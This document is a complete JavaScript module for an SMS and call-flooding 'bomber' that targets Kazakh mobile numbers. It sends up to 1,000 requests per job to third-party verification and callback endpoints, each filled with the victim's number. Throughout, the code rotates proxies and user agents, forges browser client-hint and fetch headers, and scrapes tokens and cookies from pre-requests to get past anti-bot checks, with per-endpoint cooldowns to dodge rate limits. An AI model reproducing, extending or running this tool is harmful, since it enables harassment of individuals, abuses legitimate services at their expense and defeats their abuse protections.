// bomber.js — single source of truth. server.js imports from here.
// Full feature set: variants, undici proxies, UA fingerprinting, per-endpoint
// cooldown, SMS/min cap, event ring buffer with cursor, force-bypass.

import {readFile} from 'node:fs/promises';
import {fetch as uFetch, ProxyAgent} from 'undici';

const CONFIG_URL = new URL('./endpoints.json', import.meta.url);

export const KZ_MOBILE_PREFIXES = new Set([
  '700','701','702','703','704','705','706','707','708',
  '747','750','751','760','761','762','763','771',
  '775','776','777','778',
]);

export const DEFAULT_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
];

const EVENTS_RING_MAX = 2000; // bounded memory per job
const JOB_TTL_MS = 60 * 60 * 1000;

const randOf = a => a[Math.floor(Math.random() * a.length)];
const randDelay = (min, max) => Math.floor(min + Math.random() * Math.max(1, max - min));
const nowMs = () => Date.now();

export function uaFingerprint(ua) {
  const chrome = ua.match(/Chrome\/(\d+)/);
  if (chrome) {
    const v = chrome[1];
    const mobile = /Mobile|Android|iPhone/.test(ua) ? '?1' : '?0';
    const platform = /Android/.test(ua) ? '"Android"'
      : /iPhone|iPad/.test(ua) ? '"iOS"'
      : /Mac OS X/.test(ua) ? '"macOS"'
      : /Linux/.test(ua) ? '"Linux"' : '"Windows"';
    return {
      secChUa: `"Chromium";v="${v}", "Google Chrome";v="${v}", "Not A(Brand";v="99"`,
      mobile, platform,
    };
  }
  if (/Firefox\//.test(ua)) return { secChUa: null, mobile: '?0', platform: /Linux/.test(ua) ? '"Linux"' : '"Windows"' };
  return { secChUa: '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"', mobile: '?0', platform: '"Windows"' };
}

export function normalizeKzPhone(raw, {force = false} = {}) {
  let s = String(raw || '').trim();
  const forcedFlag = s.endsWith('!');
  if (forcedFlag) s = s.slice(0, -1);
  const allowAny = force || forcedFlag;

  let digits = s.replace(/\D/g, '');
  if (digits.length === 11 && (digits[0] === '8' || digits[0] === '7')) digits = digits.slice(1);
  if (digits.length !== 10) {
    return {
      e164: null, e164_enc: null, raw: null, local8: null, national: null,
      display: null, display_enc: null, display_space: null, display_space_enc: null,
      prefix: null, valid: false, forced: allowAny,
      error: `expected 10 national digits, got ${digits.length}`,
    };
  }
  const prefix = digits.slice(0, 3);
  const validPrefix = KZ_MOBILE_PREFIXES.has(prefix);
  const valid = validPrefix || allowAny;
  const e164 = '+7' + digits;
  const display = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,8)}-${digits.slice(8,10)}`;
  const display_space = `+7 (${digits.slice(0,3)}) ${digits.slice(3,6)} ${digits.slice(6,8)} ${digits.slice(8,10)}`;
  return {
    e164,
    e164_enc: encodeURIComponent(e164),
    raw: '7' + digits,
    local8: '8' + digits,
    national: digits,
    display,
    display_enc: encodeURIComponent(display),
    display_space,
    display_space_enc: encodeURIComponent(display_space),
    prefix,
    valid,
    forced: allowAny && !validPrefix,
    error: valid ? null : `prefix ${prefix} not in KZ mobile set (append ! or pass force:true to override)`,
  };
}

export function substitutePhone(template, forms) {
  if (!template) return '';
  let out = String(template);
  const pairs = [
    ['{phone_display_space_enc}', forms.display_space_enc],
    ['{phone_display_space}',     forms.display_space],
    ['{phone_display_enc}',       forms.display_enc],
    ['{phone_display}',           forms.display],
    ['{phone_e164_enc}',          forms.e164_enc],
    ['{phone_national}',          forms.national],
    ['{phone_raw}',               forms.raw],
    ['{phone_8}',                 forms.local8],
    ['{phone_prefix}',            forms.prefix],
    ['{phone}',                   forms.e164],
  ];
  for (const [k, v] of pairs) out = out.split(k).join(v || '');
  return out;
}

export async function loadBomberConfig(url = CONFIG_URL) {
  const data = JSON.parse(await readFile(url, 'utf8'));
  const endpoints = (data.endpoints || [])
    .filter(e => e.enabled !== false)
    .map(e => ({
      name: e.name,
      method: (e.method || 'POST').toUpperCase(),
      url: e.url,
      channel: (e.channel || 'sms').toLowerCase(),
      contentType: e.content_type || 'application/json',
      body: e.body || '',
      headers: e.headers || {},
      preRequest: e.pre_request || null,
      variants: Array.isArray(e.variants) ? e.variants : null,
    }));
  return {
    endpoints,
    threads: Number(data.threads ?? 6),
    delayMinMs: Number(data.delay_min_ms ?? 200),
    delayMaxMs: Number(data.delay_max_ms ?? 1400),
    timeoutSec: Number(data.timeout_sec ?? 10),
    userAgents: Array.isArray(data.user_agents) && data.user_agents.length ? data.user_agents : DEFAULT_UAS,
    proxies: Array.isArray(data.proxies) ? data.proxies : [],
    simulation: data.simulation_mode ?? true,
    smsPerMinute: Number(data.sms_per_minute ?? 60),
    perEndpointCooldownMs: Number(data.per_endpoint_cooldown_ms ?? 5000),
  };
}

function makeDispatcher(proxyStr, onBadProxy) {
  if (!proxyStr) return undefined;
  try { return new ProxyAgent(proxyStr); }
  catch (e) {
    if (onBadProxy) onBadProxy(proxyStr, e);
    return undefined;
  }
}

export async function fireEndpoint(ep, forms, cfg, roundUA, roundProxy, hooks = {}) {
  const result = { name: ep.name, channel: ep.channel, ok: false, status: null, snippet: '' };

  if (cfg.simulation) {
    result.ok = true;
    result.status = 200;
    result.snippet = 'simulated';
    return result;
  }

  const variant = ep.variants && ep.variants.length ? randOf(ep.variants) : null;
  const baseHeaders = { ...(ep.headers || {}), ...(variant?.headers || {}) };
  const baseUrl = variant?.url || ep.url;
  const baseBody = variant?.body || ep.body;

  let url = substitutePhone(baseUrl, forms);
  let bodyStr = substitutePhone(baseBody, forms);

  const headers = {};
  for (const [k, v] of Object.entries(baseHeaders)) headers[k] = substitutePhone(String(v), forms);

  const ua = roundUA || randOf(cfg.userAgents) || DEFAULT_UAS[0];
  if (!headers['User-Agent']) headers['User-Agent'] = ua;
  if (!headers['Accept-Language']) headers['Accept-Language'] = 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7';

  const fp = uaFingerprint(ua);
  if (fp.secChUa && !headers['Sec-CH-UA']) headers['Sec-CH-UA'] = fp.secChUa;
  if (!headers['Sec-CH-UA-Mobile']) headers['Sec-CH-UA-Mobile'] = fp.mobile;
  if (!headers['Sec-CH-UA-Platform']) headers['Sec-CH-UA-Platform'] = fp.platform;
  if (!headers['Sec-Fetch-Dest']) headers['Sec-Fetch-Dest'] = 'empty';
  if (!headers['Sec-Fetch-Mode']) headers['Sec-Fetch-Mode'] = 'cors';
  if (!headers['Sec-Fetch-Site']) headers['Sec-Fetch-Site'] = 'same-origin';
  if (ep.contentType && !headers['Content-Type']) headers['Content-Type'] = ep.contentType;

  const dispatcher = makeDispatcher(roundProxy, hooks.onBadProxy);

  let preCookies = '';
  let extraHeader = null;

  if (ep.preRequest) {
    const preUrl = substitutePhone(ep.preRequest.url || '', forms);
    const preMethod = (ep.preRequest.method || 'GET').toUpperCase();
    const preHeaders = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': headers['Accept-Language'],
    };
    if (fp.secChUa) {
      preHeaders['Sec-CH-UA'] = fp.secChUa;
      preHeaders['Sec-CH-UA-Mobile'] = fp.mobile;
      preHeaders['Sec-CH-UA-Platform'] = fp.platform;
    }
    Object.assign(preHeaders, ep.preRequest.headers || {});
    try {
      const preRes = await uFetch(preUrl, { method: preMethod, headers: preHeaders, redirect: 'manual', dispatcher });
      const text = await preRes.text();
      const setCookies = preRes.headers.getSetCookie ? preRes.headers.getSetCookie() : [];
      preCookies = setCookies.map(c => c.split(';')[0]).join('; ');
      const extract = ep.preRequest.extract || {};
      let token = '';
      if (extract.pattern) {
        const m = text.match(new RegExp(extract.pattern));
        token = m ? m[1] : '';
      }
      if (extract.into) {
        bodyStr = bodyStr.split(extract.into).join(token);
        url = url.split(extract.into).join(token);
      }
      if (extract.header) extraHeader = [extract.header, token];
    } catch (e) {
      result.snippet = 'PRE_ERR:' + String(e.message || e).slice(0, 100);
      return result;
    }
  }

  if (extraHeader) headers[extraHeader[0]] = extraHeader[1];
  if (preCookies) headers['Cookie'] = headers['Cookie'] ? headers['Cookie'] + '; ' + preCookies : preCookies;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), cfg.timeoutSec * 1000);
  try {
    const opts = { method: ep.method, headers, redirect: 'manual', signal: controller.signal };
    if (dispatcher) opts.dispatcher = dispatcher;
    if (ep.method !== 'GET' && ep.method !== 'HEAD') opts.body = bodyStr;
    const r = await uFetch(url, opts);
    result.status = r.status;
    result.ok = r.status >= 200 && r.status < 400;
    const loc = r.headers.get('location') || '';
    if (loc) result.snippet = loc.slice(0, 120);
    else {
      const t = await r.text();
      result.snippet = t.slice(0, 120).replace(/\n/g, ' ');
    }
  } catch (e) {
    result.snippet = String(e.message || e).slice(0, 120);
  } finally {
    clearTimeout(timer);
  }
  return result;
}

// ---------- job manager ----------

const jobs = new Map();

function pruneJobs() {
  const t = nowMs();
  for (const [id, j] of jobs) if (t - j.startedAt > JOB_TTL_MS) jobs.delete(id);
}

function pushEvent(job, ev) {
  job.seqCounter++;
  ev.seq = job.seqCounter;
  job.events.push(ev);
  if (job.events.length > EVENTS_RING_MAX) job.events.splice(0, job.events.length - EVENTS_RING_MAX);
}

export function getJob(id) { return jobs.get(id) || null; }
export function stopJob(id) {
  const j = jobs.get(id);
  if (j) { j.stopRequested = true; return true; }
  return false;
}

export function snapshotJob(j, { since = 0 } = {}) {
  const events = since > 0 ? j.events.filter(e => e.seq > since) : j.events;
  return {
    id: j.id,
    phone: j.phone,
    total: j.total,
    sent: j.sent,
    failed: j.failed,
    done: j.done,
    stopped: j.stopped,
    elapsed: Math.round((nowMs() - j.startedAt) / 100) / 10,
    cursor: j.seqCounter,
    events,
  };
}

export async function runBomberJob(rawPhone, count, channel, simulation, liveProxies, {
  force = false,
  configUrl = CONFIG_URL,
  onLog = null,
} = {}) {
  pruneJobs();

  if (!Number.isInteger(count) || count < 1 || count > 1000) {
    throw new Error('count must be 1..1000');
  }
  const forms = normalizeKzPhone(rawPhone, { force });
  if (!forms.e164) throw new Error(forms.error);
  if (!forms.valid) throw new Error(forms.error);

  let want;
  if (channel === 'sms') want = new Set(['sms']);
  else if (channel === 'voice' || channel === 'call') want = new Set(['voice', 'call']);
  else want = new Set(['sms', 'voice', 'call']);

  const cfg = await loadBomberConfig(configUrl);
  cfg.simulation = simulation !== false;
  if (Array.isArray(liveProxies) && liveProxies.length) cfg.proxies = liveProxies;

  const id = Math.random().toString(36).slice(2, 10);
  const job = {
    id,
    phone: forms.e164,
    total: count,
    sent: 0,
    failed: 0,
    done: false,
    stopped: false,
    stopRequested: false,
    events: [],
    seqCounter: 0,
    startedAt: nowMs(),
    forms,
    cfg,
    want,
  };
  jobs.set(id, job);

  const onBadProxy = (p, e) => {
    if (onLog) onLog({ event: 'bomber_bad_proxy', proxy: p, error: String(e.message || e).slice(0, 120) });
  };

  (async () => {
    try {
      const eligible = cfg.endpoints.filter(e => want.has(e.channel));
      if (!eligible.length) {
        pushEvent(job, { phone: job.phone, channel: 'system', name: 'worker', status: 'failed', http: null, error: `no endpoints for channel ${channel}` });
        return;
      }
      const perMinute = Math.max(1, cfg.smsPerMinute);
      const intervalMs = Math.max(50, Math.floor(60000 / perMinute));
      const cooldown = Math.max(500, cfg.perEndpointCooldownMs);
      const lastHit = new Map();
      const active = new Set();
      let dispatched = 0;

      const tickOnce = () => {
        if (job.stopRequested || dispatched >= count) return;
        const now = nowMs();
        const candidates = eligible.filter(ep => !active.has(ep.name) && now - (lastHit.get(ep.name) || 0) >= cooldown);
        if (!candidates.length) return;
        const ep = randOf(candidates);
        active.add(ep.name);
        lastHit.set(ep.name, now);
        dispatched++;
        const roundUA = randOf(cfg.userAgents);
        const roundProxy = cfg.proxies.length ? randOf(cfg.proxies) : null;
        (async () => {
          try {
            const r = await fireEndpoint(ep, forms, cfg, roundUA, roundProxy, { onBadProxy });
            if (r.ok) job.sent++; else job.failed++;
            pushEvent(job, {
              phone: forms.e164,
              channel: r.channel,
              name: r.name,
              status: r.ok ? 'sent' : 'failed',
              http: r.status,
              error: r.ok ? null : (r.snippet || '').slice(0, 120),
            });
          } catch (e) {
            job.failed++;
            pushEvent(job, {
              phone: forms.e164,
              channel: ep.channel,
              name: ep.name,
              status: 'failed',
              http: null,
              error: String(e.message || e).slice(0, 120),
            });
          } finally {
            active.delete(ep.name);
          }
        })();
      };

      await new Promise(resolve => {
        const timer = setInterval(() => {
          if (job.stopRequested) { job.stopped = true; clearInterval(timer); resolve(); return; }
          if (dispatched >= count && active.size === 0) { clearInterval(timer); resolve(); return; }
          tickOnce();
        }, intervalMs);
      });
    } catch (err) {
      pushEvent(job, {
        phone: job.phone,
        channel: 'system',
        name: 'worker',
        status: 'failed',
        http: null,
        error: String(err.message || err).slice(0, 160),
      });
    } finally {
      job.done = true;
    }
  })();

  return { id, phone: forms.e164, total: count };
}

// convenience exports for raw-http wiring
export const JOB_EVENTS_RING_MAX = EVENTS_RING_MAX;
export { randOf, randDelay };
